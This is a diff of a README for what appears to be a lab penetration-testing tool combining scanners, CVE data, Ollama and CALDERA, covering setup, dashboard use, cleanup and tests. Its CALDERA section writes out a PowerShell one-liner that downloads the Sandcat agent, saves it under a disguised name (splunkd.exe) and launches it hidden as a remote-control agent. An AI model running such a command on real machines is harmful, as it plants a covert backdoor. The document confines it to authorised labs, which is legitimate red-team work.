@@ -170,6 +170,10 @@ MITRE_CVE_REPO=https://github.com/CVEProject/cvelistV5.git
 
 MySQL is optional for the GUI to load, but database persistence requires a reachable MySQL server and the configured credentials.
 
+`OLLAMA_URL` can be either `http://127.0.0.1:11434` or
+`http://127.0.0.1:11434/api/generate`; the app adds `/api/generate`
+automatically when only the base URL is configured.
+
 ## Scanning Tools
 
 The Kali installer installs the main toolchain:
@@ -192,7 +196,7 @@ Check local tool availability:
 ```bash
 cd project
 source .venv/bin/activate
-python scripts/check_tooling.py
+python3 scripts/check_tooling.py
 ```
 
 ## CVE Data
@@ -213,6 +217,12 @@ If CVE data looks stale or CVSS metadata is missing:
 python scripts/audit_cve_source.py
 ```
 
+The CVE review is strict by design. Confirmed CVE findings appear only when
+the collected product/version/service evidence matches the official CVE List
+records closely enough. If no confirmed CVEs are linked, use **Open CVE
+Review** on the dashboard to see source/index status and any candidate CVE
+references retained for analyst review.
+
 ## Ollama
 
 Install and start Ollama, then pull the configured model:
@@ -223,6 +233,13 @@ ollama pull llama3.2:1b
 ```
 
 The app uses Ollama for AI technique planning and the AI chat panel. If Ollama is unavailable, the app still runs and returns a safe unavailable message.
+
+The AI Chatbox shows Ollama status in the sidebar. If it says the model is not
+pulled, run:
+
+```bash
+ollama pull llama3.2:1b
+```
 
 ## Caldera
 
@@ -235,17 +252,12 @@ cd /path/to/caldera
 python3 server.py --insecure
 ```
 
-Editable Windows Sandcat deploy block. Paste it into an authorised Windows lab
-target PowerShell session and edit only `CALDERA_SERVER` when your Kali IP
-changes:
+Editable Windows Sandcat deploy command. Paste it into an authorised Windows
+lab target PowerShell session and edit only the IP in `$server` when your Kali
+VM IP changes:
 
 ```powershell
-# Edit this IP if your Kali VM address changes; it must be reachable from the target.
-$CALDERA_SERVER="http://CHANGE-THIS-TO-YOUR-KALI-IP:8888";
-# Download the official Sandcat payload from CALDERA.
-$url="$CALDERA_SERVER/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url);
-# Replace any old lab Sandcat copy, then start a fresh agent in the red group.
-Get-Process | Where-Object {$_.Modules.FileName -like "C:\Users\Public\splunkd.exe"} | Stop-Process -Force -ErrorAction SilentlyContinue; Remove-Item -Force "C:\Users\Public\splunkd.exe" -ErrorAction SilentlyContinue; [IO.File]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null; Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $CALDERA_SERVER -group red" -WindowStyle Hidden;
+$server="http://CHANGE-THIS-TO-YOUR-KALI-IP:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
 ```
 
 Editable Linux Sandcat deploy block:
@@ -267,15 +279,71 @@ Then in AutoPenTest:
 4. Copy the deploy command into the authorised lab target if needed.
 5. Select techniques and run Caldera only when execution is explicitly enabled and authorised.
 
+## Dashboard Flow
+
+After a scan completes, the browser redirects to the results dashboard. Use:
+
+- **Open CVE Review** to inspect confirmed CVEs, candidate references, and CVE index status.
+- **Run Lab Validation** to run non-destructive reachability/default-content checks against allowlisted services.
+- **Refresh Agent Status** to verify CALDERA/Sandcat readiness.
+- **Generate Report** to open a dedicated report page.
+- **Download Report** to export the generated text report.
+
+Lab validation does not exploit the target. It performs safe checks such as TCP
+reachability, HTTP default-content checks, and FTP anonymous-login validation
+where applicable.
+
+## Cleanup
+
+Use the cleanup helper when you want to remove generated runtime files between
+demo/test runs:
+
+```bash
+cd project
+python3 utils/cleanup.py
+```
+
+Default cleanup removes transient logs, scan evidence files, generated report
+files, and Python caches. It preserves saved result JSON, handoff packages, the
+local CVE mirror/index, and `.env`.
+
+Preview cleanup without deleting anything:
+
+```bash
+python3 utils/cleanup.py --dry-run
+```
+
+Clear saved scan result JSON only when you intentionally want a fresh dashboard
+history:
+
+```bash
+python3 utils/cleanup.py --include-results
+```
+
+Keep command evidence files while still clearing logs/reports/caches:
+
+```bash
+python3 utils/cleanup.py --keep-scan-evidence
+```
+
+Clear the local CVE mirror/index only when you plan to resync/rebuild it:
+
+```bash
+python3 utils/cleanup.py --include-cve-data
+python3 scripts/sync_mitre_cve_database.py
+python3 scripts/rebuild_mitre_cve_index.py
+```
+
 ## Testing
 
 From repository root:
 
 ```bash
-pytest -q
-python -m py_compile project/app.py project/config.py project/storage/*.py project/scanners/*.py project/scripts/*.py
-python project/scripts/audit_no_scoring.py
-python project/scripts/audit_cve_source.py
+cd project
+python3 -m pytest tests -q
+python3 -m py_compile app.py config.py storage/*.py scanners/*.py scripts/*.py utils/cleanup.py
+python3 scripts/audit_no_scoring.py
+python3 scripts/audit_cve_source.py
 ```
 
 ## Project Layout
